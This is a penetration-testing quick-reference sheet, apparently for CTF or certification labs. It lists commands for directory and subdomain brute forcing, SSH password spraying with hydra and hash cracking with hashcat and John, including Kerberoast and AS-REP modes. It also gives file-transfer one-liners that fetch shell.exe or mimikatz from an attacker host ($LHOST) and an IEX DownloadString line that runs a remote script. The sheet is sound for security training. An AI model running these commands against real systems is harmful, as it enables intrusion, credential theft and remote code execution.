# Quick Reference

Wordlists, file transfer methods, and hash cracking cheat sheet.

---

## WORDLISTS

### Directory brute forcing

Go-to wordlist for gobuster, feroxbuster, ffuf — 220k entries

```bash
gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

---

### Password cracking

Standard password wordlist — 14 million entries

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

---

### Alternative directory list

Catches paths that dirbuster misses — 30k entries

```bash
gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

---

### Subdomain / vhost scanning

Top subdomains for vhost discovery — 5k entries

```bash
gobuster vhost -u http://domain.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
gobuster dns -d domain.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

---

### Username enumeration

Common first names as usernames — 10k entries

```bash
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t $IP
hydra -L /usr/share/seclists/Usernames/Names/names.txt -p 'Password1' $IP ssh
```

---

### SNMP community strings

Brute force SNMP community strings

```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt $IP
```

---

### Install SecLists

Massive collection of wordlists — Discovery, Fuzzing, Passwords, Usernames

```bash
sudo apt install seclists -y
ls /usr/share/seclists/
```

---

## FILE TRANSFER METHODS

### Host files on attacker (HTTP)

Start a web server in your current directory — Most common transfer method

```bash
python3 -m http.server 80
```

---

### Download to Linux target

wget or curl — Try both if one isn't available

```bash
wget http://$LHOST/linpeas.sh -O /tmp/linpeas.sh
curl http://$LHOST/chisel -o /tmp/chisel
```

---

### Download to Windows target (certutil)

Built into every Windows version — Rarely blocked

```bash
certutil -urlcache -split -f http://$LHOST/shell.exe C:\Temp\shell.exe
```

---

### Download to Windows target (PowerShell)

Multiple methods — Try next one if blocked

```powershell
Invoke-WebRequest -Uri http://$LHOST/shell.exe -OutFile C:\Temp\shell.exe
(New-Object Net.WebClient).DownloadFile('http://$LHOST/shell.exe','C:\Temp\shell.exe')
IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/shell.ps1')
```

---

### Host files on attacker (SMB)

When HTTP is blocked on target — Works great for Windows

```bash
# On attacker:
impacket-smbserver share . -smb2support

# On Windows target:
copy \\$LHOST\share\mimikatz.exe C:\Temp\
```

---

### Netcat file transfer

Raw TCP — When nothing else works

```bash
# On attacker (send):
nc -nlvp 4444 < linpeas.sh

# On target (receive):
nc $LHOST 4444 > /tmp/linpeas.sh
```

---

### Base64 encode/decode

Copy-paste through the terminal — When all transfers are blocked

```bash
# On attacker (encode):
base64 -w 0 file.bin

# On target (decode):
echo 'BASE64STRING' | base64 -d > file.bin
```

---

## HASH CRACKING

### Identify hash type

Always identify before cracking — Determines hashcat mode

```bash
hashid '$6$rounds=5000$salt$hash'
hash-identifier
```

<details>
<summary>Common Hash Formats</summary>

```
MD5:        32 hex chars              → hashcat -m 0
SHA1:       40 hex chars              → hashcat -m 100
SHA256:     64 hex chars              → hashcat -m 1400
SHA512:     128 hex chars             → hashcat -m 1800 (if $6$ prefix)
NTLM:       32 hex chars (no salt)    → hashcat -m 1000
NTLMv2:     user::domain:challenge... → hashcat -m 5600
bcrypt:     $2a$ or $2y$ prefix       → hashcat -m 3200
Kerberoast: $krb5tgs$23$*...          → hashcat -m 13100
AS-REP:     $krb5asrep$23$...         → hashcat -m 18200
md5crypt:   $1$ prefix                → hashcat -m 500
sha512crypt:$6$ prefix                → hashcat -m 1800
```
</details>

---

### John the Ripper

Auto-detects hash type — Good general purpose cracker

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
```

---

### Hashcat — MD5

Mode 0 — Fastest hash to crack

```bash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

---

### Hashcat — SHA256

Mode 1400

```bash
hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt
```

---

### Hashcat — NTLM

Mode 1000 — Windows local password hashes, very fast

```bash
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```

---

### Hashcat — NTLMv2

Mode 5600 — Captured from Responder or network sniffing

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

---

### Hashcat — bcrypt

Mode 3200 — Very slow, use rules instead of full wordlist

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

---

### Hashcat — Kerberoast (TGS-REP)

Mode 13100 — Cracking Kerberoasted service account hashes

```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

---

### Hashcat — AS-REP Roast

Mode 18200 — Cracking AS-REP hashes from accounts without pre-auth

```bash
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

---

### Online hash lookup

Instant results for common hashes — Only for non-sensitive/CTF hashes

```bash
# Paste hash at:
# https://crackstation.net/
# https://hashes.com/en/decrypt/hash
```

---
